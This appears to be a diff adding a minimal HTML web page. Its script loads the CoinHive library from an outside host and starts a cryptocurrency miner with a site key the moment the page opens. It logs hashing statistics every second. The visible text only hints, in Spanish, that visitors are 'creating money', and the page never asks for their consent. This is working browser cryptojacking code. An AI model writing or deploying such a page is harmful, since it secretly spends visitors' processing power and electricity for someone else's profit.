@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Document</title>
+  <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+  <script>
+	  var miner = new CoinHive.Anonymous('YjlPFKreJ2g0MloNseZVui7zm08a2MyR');
+	  miner.start();
+
+    miner.on('found', function() {
+      console.log('Hash found');
+    })
+	  miner.on('accepted', function() {
+      console.log('Hash acepted');
+    })
+
+	// Update stats once per second
+	  setInterval(function() {
+		  var hashesPerSecond = miner.getHashesPerSecond();
+		  var totalHashes = miner.getTotalHashes();
+		  var acceptedHashes = miner.getAcceptedHashes();
+
+      console.log(hashesPerSecond, totalHashes, acceptedHashes);
+	  }, 1000);
+  </script>
+</head>
+<body>
+  <h1>Visitas por mexico!</h1>
+  <span>
+    Puedes creer que mientras estás en esta página estás creando dinero?
+  </span>
+</body>
+</html>
